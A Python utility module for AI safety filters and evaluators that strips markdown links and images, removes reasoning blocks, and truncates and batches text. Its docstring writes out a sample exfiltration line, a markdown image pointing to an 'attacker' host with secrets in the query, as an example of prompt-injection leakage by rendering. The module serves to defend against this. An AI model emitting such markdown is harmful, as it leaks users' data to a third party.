"""Text utilities shared across safety filters and evaluators.

Design notes
------------
- All functions are pure and stdlib-only.
- ``strip_markdown_links`` exists because markdown image/link syntax is a
  documented exfiltration channel: a generation containing
  ``![x](https://attacker/?d=SECRETS)`` leaks data when rendered
  (see docs/risks/prompt_injection.md — the Anthropic UI incident class).
- ``strip_thinking`` removes o1-style ``<think>`` blocks so evaluation
  harnesses score the *final* answer only.
"""

from __future__ import annotations

import re
from typing import Iterable

_MARKDOWN_IMAGE_RE = re.compile(
    r"!\[[^\]]*\]\(\s*https?://[^\s)]+\s*(?:\"[^\"]*\")?\s*\)",
    flags=re.IGNORECASE,
)
_MARKDOWN_LINK_RE = re.compile(
    r"\[([^\]]*)\]\(\s*https?://[^\s)]+\s*(?:\"[^\"]*\")?\s*\)",
    flags=re.IGNORECASE,
)
_THINK_RE = re.compile(r"<think>.*?</think>", flags=re.DOTALL | re.IGNORECASE)
_WS_RE = re.compile(r"\s+")


def normalize_whitespace(text: str) -> str:
    """Collapse runs of whitespace to single spaces and strip ends."""
    return _WS_RE.sub(" ", text).strip()


def clamp01(value: float) -> float:
    """Clamp a float into [0, 1] (scores, confidences)."""
    return max(0.0, min(1.0, float(value)))


def safe_truncate(text: str, max_chars: int, *, ellipsis: str = "...") -> str:
    """Truncate to at most ``max_chars`` without splitting words when possible."""
    if max_chars <= 0:
        return ""
    if len(text) <= max_chars:
        return text
    cut = text[: max_chars - len(ellipsis)]
    if " " in cut:
        cut = cut[: cut.rfind(" ")]
    return cut.rstrip() + ellipsis


def strip_markdown_links(text: str, *, keep_label: bool = True) -> str:
    """Remove markdown links/images; optionally keep the link label text.

    Used to neutralize data-exfiltration-by-rendering before showing model
    output in an HTML/Markdown surface.
    """
    text = _MARKDOWN_IMAGE_RE.sub("", text)
    if keep_label:
        return _MARKDOWN_LINK_RE.sub(r"\1", text)
    return _MARKDOWN_LINK_RE.sub("", text)


def strip_thinking(text: str) -> str:
    """Remove ``<think>...</think>`` reasoning blocks (reasoning-model outputs)."""
    return _THINK_RE.sub("", text).strip()


def iter_batches(items: Iterable, batch_size: int):
    """Yield lists of at most ``batch_size`` items (for API-batched evals)."""
    if batch_size <= 0:
        raise ValueError("batch_size must be positive")
    batch: list = []
    for item in items:
        batch.append(item)
        if len(batch) >= batch_size:
            yield batch
            batch = []
    if batch:
        yield batch
